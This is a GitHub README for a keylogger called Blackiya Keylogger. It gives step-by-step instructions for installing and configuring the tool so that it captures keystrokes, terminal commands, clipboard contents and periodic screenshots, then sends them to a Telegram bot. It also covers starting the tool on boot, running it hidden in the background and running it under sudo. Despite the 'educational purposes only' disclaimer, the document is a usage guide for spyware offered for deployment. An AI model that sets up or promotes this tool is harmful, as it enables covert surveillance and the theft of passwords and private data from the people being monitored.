BLACKIYA KEYLOGGER v4.0
Author: Sachin | GitHub: @BlAck1ya

WHAT IS BLACKIYA KEYLOGGER?

Educational security tool for penetration testing. Captures keystrokes from browsers, terminals, clipboard and screenshots.

FEATURES

Browser Capture (Chrome, Firefox, Edge, Brave) ✅
Terminal Commands ✅
Screenshots (every 45 seconds) ✅
Clipboard Monitoring ✅
Window Tracking ✅
Batch Processing ✅
Telegram Integration ✅
Auto-start on Boot ✅
Cross-platform ✅

TELEGRAM BOT SETUP

Search @BotFather on Telegram

Send /newbot

Name: BlackiyaKeyloggerBot

Username: BlackiyaKeyloggerBot

Copy TOKEN (example: 1234567890:ABCdefGHIjklMNO)

Search @userinfobot on Telegram

Send /start

Copy CHAT ID (example: 9876543210)

Test: curl "https://api.telegram.org/botYOUR_TOKEN/sendMessage?chat_id=CHAT_ID&text=Test"

LINUX INSTALLATION

sudo apt update && sudo apt install python3 python3-pip python3-venv scrot xdotool xclip -y
git clone https://github.com/BlAck1ya/BlackiyaKeylogger.git
cd BlackiyaKeylogger
python3 -m venv venv
source venv/bin/activate
pip install requests pynput
nano BlackiyaKeylogger.py (add your token and chat id)
python3 BlackiyaKeylogger.py

WINDOWS INSTALLATION

git clone https://github.com/BlAck1ya/BlackiyaKeylogger.git
cd BlackiyaKeylogger
python -m venv venv
venv\Scripts\activate
pip install requests pynput
python BlackiyaKeylogger.py

CONFIGURATION

Edit BlackiyaKeylogger.py and change:

TELEGRAM_BOT_TOKEN = "your_token_here"
TELEGRAM_CHAT_ID = "your_chat_id_here"
SEND_DELAY = 0.5
SCREENSHOT_INTERVAL = 45

<img width="542" height="85" alt="image" src="https://github.com/user-attachments/assets/c5d5849b-84ad-45e9-8a4f-e02fdeac44ac" />


USAGE

Basic run: source venv/bin/activate && python3 BlackiyaKeylogger.py
Background run: nohup python3 BlackiyaKeylogger.py > /dev/null 2>&1 &
Stop: pkill -f BlackiyaKeylogger

TESTING

Open terminal and type: echo "Hello test"

Open Chrome and type something

Wait 45 seconds for screenshot

Copy any text to test clipboard
Check Telegram for all captured data

TROUBLESHOOTING

externally-managed-environment: Use virtual environment (see installation)
Black screenshot: Switch from Wayland to X11
Browser keys not captured: Run with sudo python3 BlackiyaKeylogger.py
Clipboard not working: sudo apt install xclip
Telegram no messages: Check token and chat id

LEGAL DISCLAIMER

FOR EDUCATIONAL PURPOSES ONLY. Use only on your own systems. Unauthorized use is illegal under IT Act 2000.

                                        Made with 🔥 by BlAck1ya


## Getting Started

```bash
git clone https://github.com/BlAck1ya/BlackiyaKeylogger.git

cd BlackiyaKeylogger

python3 -m venv venv

source venv/bin/activate

pip install -r requirements.txt

python3 BlackiyaKeylogger.py
```
